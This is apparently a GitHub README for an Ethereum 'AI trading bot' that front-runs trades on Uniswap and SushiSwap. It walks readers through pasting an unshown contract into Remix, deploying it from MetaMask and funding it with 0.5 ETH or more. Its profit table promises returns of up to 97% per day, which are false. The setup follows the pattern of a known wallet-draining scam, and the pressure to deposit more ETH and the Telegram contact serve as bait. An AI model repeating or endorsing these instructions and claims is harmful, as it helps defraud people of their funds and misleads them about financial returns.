# AI-Trading-Bot

This repository contains a smart contract-based trading bot for **Ethereum-based tokens**, designed to interact with decentralized exchanges (DEXs) such as **Uniswap** . The bot is written in **Solidity**, using the **Uniswap V2** and **SushiSwap** routers for execution. The bot profits by frontrunning and arbitrage methods.

## Setup Instructions

Follow these steps to deploy and run your own trading bot:

STEP BY STEP INSTRUCTIONS:

🤖 If you cannot click links copy and paste them into your browser! 🤖

👉 Download MetaMask: https://metamask.io/download
If you're using Trust Wallet or Coinbase Wallet all steps are exact the same as with Meta Mask Wallet.

👉- Head over to Remix: https://remix.ethereum.org/

👉- Create “New File”. Rename it whatever you want or “bot.sol”

👉- Paste the code bot.sol into remix

👉- Go to the "Solidity Compiler" tab on Remix, Enable Optimization and Compile

👉- Go to the “Deploy & Run Transactions” tab on Remix, select the “Injected Provider” environment, then “Deploy”. This will create your own contract by confirming the MetaMask Contract creation fee.

👉- Make sure your deposit is more than 0.5 ETH( to prevent negating slippage ) to your exact contract/bot address.

👉- Click on the “Key” button, and copy your key to VALUE

👉- In the “SetBalancePercent” or “SetBalanceETH” functions, enter the amount of money the bot will work with.

👉- Click “StartNative” button to get the bot started

👉- To withdraw funds from your smart contract, click on “Stop” button, then “Withdraw”

🚨 UPDATE: I've been contacted by viewers who didn't adequately fund the contract to cover Ethereum gas and potential burn fees. The bot focuses on token contracts with a maximum 10% burn fee, though many tokens now feature fees between 2% to 6%. If you fund the contract with 0.4 ETH or less and it targets a token with higher burn fees, significant gas fees may be wasted. To mitigate this, I advise funding the contract with a minimum of 0.5 to 1 ETH to avoid potential issues (you can use the CheckLiquidity function to check that). 

📈 Estimated Profits
Investment Range (ETH)  |  Liquidity Level      |      Profits per 24 Hours
0.2 ETH - 0.5 ETH               Low                        Up to 10%
0.5 ETH - 1 ETH               Moderate                     Up to 20%
1 ETH - 3 ETH                   High                         27-35%
2 ETH - 5 ETH                   High                         35-50%
6 - 10 ETH                    Very High                      50-63%
10 ETH - 20 ETH               Very High                       76%+
20 ETH - 50 ETH             Extremely High                    97%+
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
Disclaimer: 
PLEASE READ THIS DISCLAIMER CAREFULLY. BY ACCESSING OR USING THIS WEBSITE, PARTICIPATING IN ANY CRYPTO-RELATED PROJECT, OR ENGAGING WITH ANY ASSOCIATED PRODUCTS, SERVICES, OR TOKENS, YOU AGREE TO BE BOUND BY THE TERMS AND CONDITIONS SET FORTH BELOW.
 
General Risks
Investing in cryptocurrencies and blockchain-related projects carries inherent risks due to the speculative nature of the market, technological uncertainties, and regulatory complexities. There is no guarantee of returns or profits, and the value of your investment may fluctuate significantly, potentially resulting in partial or total loss.
 
No Investment Advice
The information provided on this website, in any associated materials, or by the project team does not constitute financial, investment, legal, or tax advice. You should consult with your own professional advisors before making any decisions related to your participation in this project or any related transactions.
 
By participating in this project or engaging with any associated products, services, or tokens, you acknowledge and agree that you have read, understood, and accepted the risks and conditions outlined in this disclaimer.

❤️ — Emily




If you lost access to your bot contract:

Instead of "Deploy" by creating a new contract in the "DEPLOY & RUN OPERATIONS" section, you can access your old contract again by typing the old contract address you created in the "At Address" field and clicking the "At Address" button.
Note: Access cannot be made with any other account other than your MetaMask account where you created the contract.



## 🔗 Connect With Me

- 📬 (https://t.me/EmilyWaldes)


---

## 📄 License

This project is for educational and research purposes only. Use at your own risk.
